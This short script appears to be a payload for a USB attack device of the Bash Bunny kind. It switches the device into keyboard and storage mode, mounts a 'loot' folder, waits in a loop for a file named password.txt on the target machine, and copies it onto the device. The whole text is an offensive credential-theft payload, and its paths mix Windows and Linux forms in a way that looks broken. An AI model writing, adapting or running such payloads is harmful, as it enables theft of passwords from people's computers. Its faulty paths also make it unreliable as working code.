ATTACKMODE HID STORAGE

# Mount storage to access loot folder
mount /dev/nandf /root/udisk/

# ATTACK ONE: 

while true; do
  if [ -f H:/password.txt ]; then
    cp /H:/password.txt /root/udisk/loot/
    break
  fi
  sleep 1
done

# wait for 3 seconds for file to copy
sleep 3
